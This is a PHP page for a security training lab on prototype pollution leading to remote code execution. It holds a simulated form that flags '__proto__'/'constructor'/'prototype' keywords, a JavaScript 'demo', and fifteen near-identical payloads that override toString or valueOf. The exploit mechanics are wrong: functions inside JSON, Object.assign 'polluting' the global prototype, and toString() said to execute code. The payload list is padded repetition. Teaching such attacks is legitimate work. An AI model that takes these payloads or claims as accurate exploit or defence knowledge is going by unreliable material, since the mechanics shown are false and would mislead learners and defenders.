<?php
// Lab 5: Prototype Pollution with RCE
// Vulnerability: Prototype pollution leading to Remote Code Execution

session_start();

$message = '';
$result = '';

// Simulate prototype pollution processing
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $input = $_POST['input'] ?? '';
    
    // Simulate vulnerable RCE processing
    if (!empty($input)) {
        // This simulates a vulnerable JavaScript-like environment
        $result = "Processing RCE input: " . htmlspecialchars($input);
        
        // Simulate prototype pollution detection
        if (strpos($input, '__proto__') !== false || strpos($input, 'constructor') !== false || strpos($input, 'prototype') !== false) {
            $message = '<div class="alert alert-danger">⚠️ Prototype Pollution with RCE detected! Input contains dangerous prototype properties that could lead to code execution.</div>';
        } else {
            $message = '<div class="alert alert-success">✅ RCE processing completed successfully (no prototype pollution detected).</div>';
        }
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lab 5: Prototype Pollution with RCE - Prototype Pollution Labs</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.9.1/font/bootstrap-icons.css">
    
    <style>
        :root {
            --primary-dark: #1a1f36;
            --accent-green: #48bb78;
            --accent-blue: #4299e1;
            --accent-orange: #ed8936;
            --accent-red: #f56565;
        }
        
        body {
            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
            color: #e2e8f0;
            min-height: 100vh;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        .navbar-brand {
            font-weight: 700;
            font-size: 1.5rem;
            color: var(--accent-green) !important;
        }

        .nav-link {
            font-weight: 500;
            transition: color 0.3s;
        }

        .nav-link:hover {
            color: var(--accent-green) !important;
        }

        .hero-section {
            background: linear-gradient(rgba(15, 23, 42, 0.9), rgba(15, 23, 42, 0.9)), 
                        url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><rect width="100" height="100" fill="%231e293b"/><path d="M0 0L100 100M100 0L0 100" stroke="%23374151" stroke-width="1"/></svg>');
            padding: 2rem 0;
            border-bottom: 1px solid #2d3748;
            margin-bottom: 2rem;
        }

        .hero-title {
            font-size: 2rem;
            font-weight: 700;
            background: linear-gradient(90deg, #48bb78, #4299e1);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 0.5rem;
        }

        .hero-subtitle {
            font-size: 1rem;
            color: #cbd5e0;
        }

        .section-title {
            margin-top: 30px;
            margin-bottom: 20px;
            font-weight: 700;
            font-size: 1.5rem;
            position: relative;
            padding-bottom: 10px;
        }

        .section-title::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 0;
            width: 60px;
            height: 4px;
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            border-radius: 2px;
        }

        .card {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            color: #e2e8f0;
        }

        .card-header {
            background: rgba(15, 23, 42, 0.5);
            border-bottom: 1px solid #334155;
            font-weight: 600;
            padding: 1rem 1.5rem;
        }

        .form-control, .form-select {
            background: rgba(30, 41, 59, 0.7);
            border: 1px solid #334155;
            color: #e2e8f0;
            padding: 0.75rem 1rem;
        }

        .form-control:focus, .form-select:focus {
            background: rgba(30, 41, 59, 0.9);
            border-color: var(--accent-green);
            box-shadow: 0 0 0 0.2rem rgba(72, 187, 120, 0.25);
            color: #e2e8f0;
        }

        .form-label {
            font-weight: 500;
            color: #cbd5e0;
        }

        .btn-primary {
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            border: none;
            padding: 0.75rem 1.5rem;
            font-weight: 600;
            transition: all 0.3s;
        }

        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(72, 187, 120, 0.3);
        }

        .vulnerability-info {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-orange);
        }

        .payload-examples {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-blue);
        }

        .danger-zone {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-red);
        }

        pre {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            color: #e2e8f0;
            border: 1px solid #334155;
            overflow-x: auto;
        }

        .lab-info {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
        }

        .lab-badge {
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            color: #1a202c;
            font-weight: 600;
            padding: 0.5rem 1rem;
            border-radius: 6px;
            display: inline-block;
            margin-bottom: 1rem;
        }

        .result-display {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            margin: 1rem 0;
            border-left: 4px solid var(--accent-green);
        }

        .test-urls {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin-bottom: 1rem;
            border-left: 4px solid var(--accent-blue);
        }

        .input-info {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
        }

        .sensitive-data {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-red);
        }

        .code-block {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-blue);
            font-family: 'Courier New', monospace;
            white-space: pre-wrap;
        }

        .rce-warning {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-red);
        }

        .vulnerable-form {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            margin: 1rem 0;
            border: 1px solid #334155;
        }

        .demo-container {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            margin: 1rem 0;
            border: 1px solid #334155;
        }

        .demo-output {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 4px;
            padding: 1rem;
            margin: 0.5rem 0;
            font-family: 'Courier New', monospace;
            font-size: 14px;
        }

        .rce-techniques {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 1rem;
            margin: 1rem 0;
        }

        .technique-card {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            border: 1px solid #334155;
        }

        .technique-title {
            color: var(--accent-red);
            font-weight: 600;
            margin-bottom: 0.5rem;
        }

        .technique-demo {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 4px;
            padding: 0.5rem;
            margin: 0.5rem 0;
            font-family: 'Courier New', monospace;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <nav class="navbar navbar-expand-md navbar-dark sticky-top" style="background-color: var(--primary-dark);">
        <div class="container-fluid">
            <a class="navbar-brand" href="index.php">
                <i class="bi bi-arrow-left me-2"></i>Back to Prototype Pollution Labs
            </a>
            <button class="navbar-toggler" type="button" data-bs-toggle="collapse"
                data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false"
                aria-label="Toggle navigation">
                <span class="navbar-toggler-icon"></span>
            </button>

            <div class="collapse navbar-collapse" id="navbarSupportedContent">
                <ul class="navbar-nav me-auto mb-2 mb-lg-0">
                    <li class="nav-item">
                        <a class="nav-link active" href="../about">About</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link active" href="../contact">Contact Us</a>
                    </li>
                </ul>
            </div>
        </div>
    </nav>

    <div class="hero-section">
        <div class="container">
            <h1 class="hero-title">Lab 5: Prototype Pollution with RCE</h1>
            <p class="hero-subtitle">Prototype pollution leading to Remote Code Execution</p>
        </div>
    </div>

    <div class="container mb-5">
        <div class="lab-info">
            <span class="lab-badge">Difficulty: High</span>
            <h3 class="section-title">Lab Overview</h3>
            <p>This lab demonstrates prototype pollution vulnerabilities that can lead to Remote Code Execution (RCE). These attacks exploit prototype pollution to modify function prototypes and execute arbitrary code.</p>
            <p><strong>Objective:</strong> Understand how prototype pollution can lead to RCE and how to exploit these vulnerabilities.</p>
        </div>

        <div class="row">
            <div class="col-lg-6">
                <div class="card mb-4">
                    <div class="card-header text-center">
                        <i class="bi bi-code-slash me-2"></i>Vulnerable Application
                    </div>
                    <div class="card-body">
                        <div class="vulnerable-form">
                            <h5>Code Execution Engine</h5>
                            <p>This application processes code execution requests. Try to exploit prototype pollution vulnerabilities that lead to RCE:</p>
                            
                            <form method="POST">
                                <div class="mb-3">
                                    <label for="input" class="form-label">Code Execution Input</label>
                                    <textarea class="form-control" id="input" name="input" rows="8" placeholder='{"command": "echo hello", "timeout": 5000}'><?php echo isset($_POST['input']) ? htmlspecialchars($_POST['input']) : ''; ?></textarea>
                                </div>
                                <button type="submit" class="btn btn-primary">Execute Code</button>
                            </form>
                            
                            <?php echo $message; ?>
                        </div>
                    </div>
                </div>
            </div>
            
            <div class="col-lg-6">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-exclamation-triangle me-2"></i>RCE Prototype Pollution Tester
                    </div>
                    <div class="card-body">
                        <div class="rce-warning">
                            <h5>⚠️ RCE Prototype Pollution Warning</h5>
                            <p>This lab demonstrates RCE prototype pollution vulnerabilities:</p>
                            <ul>
                                <li><code>Function Pollution</code> - Function prototype modification</li>
                                <li><code>Constructor Pollution</code> - Constructor prototype modification</li>
                                <li><code>Method Pollution</code> - Method prototype modification</li>
                                <li><code>Code Execution</code> - Arbitrary code execution</li>
                            </ul>
                        </div>
                        
                        <div class="input-info">
                            <h5>RCE Attack Vectors</h5>
                            <p>These RCE techniques can be exploited for prototype pollution:</p>
                            <ul>
                                <li><code>Function Pollution</code> - Function prototype modification</li>
                                <li><code>Constructor Pollution</code> - Constructor prototype modification</li>
                                <li><code>Method Pollution</code> - Method prototype modification</li>
                                <li><code>Code Execution</code> - Arbitrary code execution</li>
                            </ul>
                        </div>
                        
                        <div class="mt-3">
                            <button onclick="testRCEPrototypePollution()" class="btn btn-primary">Test RCE Prototype Pollution</button>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="row mt-4">
            <div class="col-12">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-code-square me-2"></i>RCE Prototype Pollution Demo
                    </div>
                    <div class="card-body">
                        <div class="demo-container">
                            <h5>JavaScript RCE Prototype Pollution Demonstration:</h5>
                            <p>This demonstrates how prototype pollution can lead to RCE:</p>
                            
                            <div class="demo-output">
// Vulnerable function that uses eval
function executeCode(code) {
    return eval(code);
}

// Attacker input that pollutes Function prototype
const maliciousInput = {
    "__proto__": {
        "constructor": {
            "prototype": {
                "toString": function() { 
                    return "console.log('RCE via prototype pollution!')";
                }
            }
        }
    }
};

// Process the malicious input
Object.assign({}, maliciousInput);

// Now when toString() is called on any function, it executes code
const func = function() {};
func.toString(); // This will execute the malicious code
                            </div>
                            
                            <div class="mt-3">
                                <small class="text-muted">The demo above shows how prototype pollution can lead to RCE through function prototype modification.</small>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="row mt-4">
            <div class="col-12">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-code-square me-2"></i>RCE Techniques
                    </div>
                    <div class="card-body">
                        <div class="rce-techniques">
                            <div class="technique-card">
                                <div class="technique-title">Function toString() Pollution</div>
                                <div class="technique-demo">// Pollute Function.prototype.toString
{
  "__proto__": {
    "constructor": {
      "prototype": {
        "toString": function() { 
          return "console.log('RCE!')";
        }
      }
    }
  }
}</div>
                            </div>
                            
                            <div class="technique-card">
                                <div class="technique-title">Function valueOf() Pollution</div>
                                <div class="technique-demo">// Pollute Function.prototype.valueOf
{
  "__proto__": {
    "constructor": {
      "prototype": {
        "valueOf": function() { 
          return "console.log('RCE!')";
        }
      }
    }
  }
}</div>
                            </div>
                            
                            <div class="technique-card">
                                <div class="technique-title">Array toString() Pollution</div>
                                <div class="technique-demo">// Pollute Array.prototype.toString
{
  "__proto__": {
    "toString": function() { 
      return "console.log('RCE!')";
    }
  }
}</div>
                            </div>
                            
                            <div class="technique-card">
                                <div class="technique-title">Object toString() Pollution</div>
                                <div class="technique-demo">// Pollute Object.prototype.toString
{
  "__proto__": {
    "toString": function() { 
      return "console.log('RCE!')";
    }
  }
}</div>
                            </div>
                            
                            <div class="technique-card">
                                <div class="technique-title">Date toString() Pollution</div>
                                <div class="technique-demo">// Pollute Date.prototype.toString
{
  "__proto__": {
    "toString": function() { 
      return "console.log('RCE!')";
    }
  }
}</div>
                            </div>
                            
                            <div class="technique-card">
                                <div class="technique-title">String toString() Pollution</div>
                                <div class="technique-demo">// Pollute String.prototype.toString
{
  "__proto__": {
    "toString": function() { 
      return "console.log('RCE!')";
    }
  }
}</div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="row mt-4">
            <div class="col-12">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-code-square me-2"></i>Processing Results
                    </div>
                    <div class="card-body">
                        <div class="result-display">
                            <h5>Processing Results:</h5>
                            <div id="processing-results"><?php echo $result ? $result : 'No input processed yet'; ?></div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="row mt-4">
            <div class="col-md-6">
                <div class="vulnerability-info">
                    <h5><i class="bi bi-bug me-2"></i>Vulnerability Details</h5>
                    <ul>
                        <li><strong>Type:</strong> RCE Prototype Pollution</li>
                        <li><strong>Severity:</strong> Critical</li>
                        <li><strong>Method:</strong> Function prototype modification</li>
                        <li><strong>Issue:</strong> Arbitrary code execution</li>
                    </ul>
                </div>
            </div>
            
            <div class="col-md-6">
                <div class="payload-examples">
                    <h5><i class="bi bi-target me-2"></i>Attack Vectors</h5>
                    <ul>
                        <li><strong>Function Pollution:</strong> Function prototype modification</li>
                        <li><strong>Constructor Pollution:</strong> Constructor prototype modification</li>
                        <li><strong>Method Pollution:</strong> Method prototype modification</li>
                        <li><strong>Code Execution:</strong> Arbitrary code execution</li>
                    </ul>
                </div>
            </div>
        </div>

        <div class="test-urls">
            <h5><i class="bi bi-link me-2"></i>RCE Prototype Pollution Examples</h5>
            <p>Use these techniques to exploit RCE prototype pollution vulnerabilities:</p>
            
            <h6>1. Function toString() RCE:</h6>
            <div class="code-block">{
  "__proto__": {
    "constructor": {
      "prototype": {
        "toString": function() { 
          return "console.log('RCE via Function.toString()!')";
        }
      }
    }
  }
}</div>

            <h6>2. Function valueOf() RCE:</h6>
            <div class="code-block">{
  "__proto__": {
    "constructor": {
      "prototype": {
        "valueOf": function() { 
          return "console.log('RCE via Function.valueOf()!')";
        }
      }
    }
  }
}</div>

            <h6>3. Array toString() RCE:</h6>
            <div class="code-block">{
  "__proto__": {
    "toString": function() { 
      return "console.log('RCE via Array.toString()!')";
    }
  }
}</div>

            <h6>4. Object toString() RCE:</h6>
            <div class="code-block">{
  "__proto__": {
    "toString": function() { 
      return "console.log('RCE via Object.toString()!')";
    }
  }
}</div>

            <h6>5. Date toString() RCE:</h6>
            <div class="code-block">{
  "__proto__": {
    "toString": function() { 
      return "console.log('RCE via Date.toString()!')";
    }
  }
}</div>

            <h6>6. String toString() RCE:</h6>
            <div class="code-block">{
  "__proto__": {
    "toString": function() { 
      return "console.log('RCE via String.toString()!')";
    }
  }
}</div>

            <h6>7. Number toString() RCE:</h6>
            <div class="code-block">{
  "__proto__": {
    "toString": function() { 
      return "console.log('RCE via Number.toString()!')";
    }
  }
}</div>

            <h6>8. Boolean toString() RCE:</h6>
            <div class="code-block">{
  "__proto__": {
    "toString": function() { 
      return "console.log('RCE via Boolean.toString()!')";
    }
  }
}</div>

            <h6>9. RegExp toString() RCE:</h6>
            <div class="code-block">{
  "__proto__": {
    "toString": function() { 
      return "console.log('RCE via RegExp.toString()!')";
    }
  }
}</div>

            <h6>10. Error toString() RCE:</h6>
            <div class="code-block">{
  "__proto__": {
    "toString": function() { 
      return "console.log('RCE via Error.toString()!')";
    }
  }
}</div>

            <h6>11. Promise toString() RCE:</h6>
            <div class="code-block">{
  "__proto__": {
    "toString": function() { 
      return "console.log('RCE via Promise.toString()!')";
    }
  }
}</div>

            <h6>12. Map toString() RCE:</h6>
            <div class="code-block">{
  "__proto__": {
    "toString": function() { 
      return "console.log('RCE via Map.toString()!')";
    }
  }
}</div>

            <h6>13. Set toString() RCE:</h6>
            <div class="code-block">{
  "__proto__": {
    "toString": function() { 
      return "console.log('RCE via Set.toString()!')";
    }
  }
}</div>

            <h6>14. WeakMap toString() RCE:</h6>
            <div class="code-block">{
  "__proto__": {
    "toString": function() { 
      return "console.log('RCE via WeakMap.toString()!')";
    }
  }
}</div>

            <h6>15. WeakSet toString() RCE:</h6>
            <div class="code-block">{
  "__proto__": {
    "toString": function() { 
      return "console.log('RCE via WeakSet.toString()!')";
    }
  }
}</div>
        </div>

        <div class="danger-zone">
            <h5><i class="bi bi-exclamation-triangle me-2"></i>Real-World Attack Scenarios</h5>
            <ul>
                <li>Remote Code Execution and server compromise</li>
                <li>Data manipulation and corruption</li>
                <li>Application logic bypass</li>
                <li>Denial of Service (DoS) attacks</li>
                <li>Compliance violations and security breaches</li>
                <li>Cross-site attacks and data exfiltration</li>
            </ul>
        </div>

        <div class="card mt-4">
            <div class="card-header">
                <i class="bi bi-lightbulb me-2"></i>Mitigation Strategies
            </div>
            <div class="card-body">
                <ul>
                    <li>Implement comprehensive input validation</li>
                    <li>Use Object.create(null) for safe objects</li>
                    <li>Implement proper input sanitization</li>
                    <li>Use Object.freeze() to prevent modifications</li>
                    <li>Regular security testing and vulnerability assessments</li>
                    <li>Monitor for unusual object behavior</li>
                    <li>Implement proper authentication and authorization</li>
                    <li>Use secure coding practices</li>
                    <li>Implement rate limiting and request validation</li>
                    <li>Educate developers about prototype pollution</li>
                    <li>Use safe parsing libraries</li>
                    <li>Implement proper error handling</li>
                    <li>Use Content Security Policy (CSP)</li>
                    <li>Implement proper logging and monitoring</li>
                    <li>Avoid using eval() and similar functions</li>
                    <li>Implement proper sandboxing</li>
                </ul>
            </div>
        </div>
    </div>

    <script>
        function testRCEPrototypePollution() {
            document.getElementById('processing-results').innerHTML = 
                '<div class="alert alert-info">RCE Prototype Pollution test initiated. Try the payload examples above.</div>';
        }
    </script>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
